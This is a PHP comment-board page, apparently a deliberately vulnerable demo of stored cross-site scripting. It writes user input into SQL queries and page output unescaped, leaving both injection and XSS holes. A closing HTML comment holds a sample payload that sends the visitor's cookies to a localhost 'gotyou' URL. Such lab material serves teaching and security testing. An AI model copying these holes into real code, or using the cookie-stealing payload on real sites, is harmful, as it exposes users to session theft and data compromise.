<html>
<head><title>XSS basic example</title></head>
<body>
<?php
  if(isset($_POST['comment'])){
    $name = "Anonymous";
    if(isset($_POST['name']) && !empty($_POST['name']))
      $name = $_POST['name'];
    
    $comment = $_POST['comment'];
    $con = mysql_connect("localhost","xss","xss");
    if (!$con) {
      die('Could not connect: ' . mysql_error());
    }
    mysql_select_db("xssexample", $con);
    $result = mysql_query("INSERT INTO comments(name,content) VALUES(\"$name\", \"$comment\")", $con);
    mysql_close($con);
  }
?>

<?php
  $con = mysql_connect("localhost","xss","xss");
  if (!$con) {
    die('Could not connect: ' . mysql_error());
  }
  mysql_select_db("xssexample", $con);
  $result = mysql_query("SELECT * FROM comments;", $con);

  mysql_close($con);

  $num = mysql_num_rows($result);
  echo $num . " comment(s)" . "<br/>";
  $i=0;
  while ($i < $num) {
    $name = mysql_result($result, $i, "name");
    $content = mysql_result($result, $i, "content");
    echo "<strong>" . $content . "</strong><br/>";
    echo "-- written by " . $name;
    echo "<br/>";
    $i++;
  }
?>
<p>Add your own comment:</p>
<form  method="post" action="basic_xss.php">
<input type="text" name="name"></input>
<input type="text" name="comment"></input>
<input type="submit" value="add" name="submit">
</form>

<!-- <script>document.write("<img src=http://localhost/gotyou/" + document.cookie + ">")</script> -->

</body>
</html>
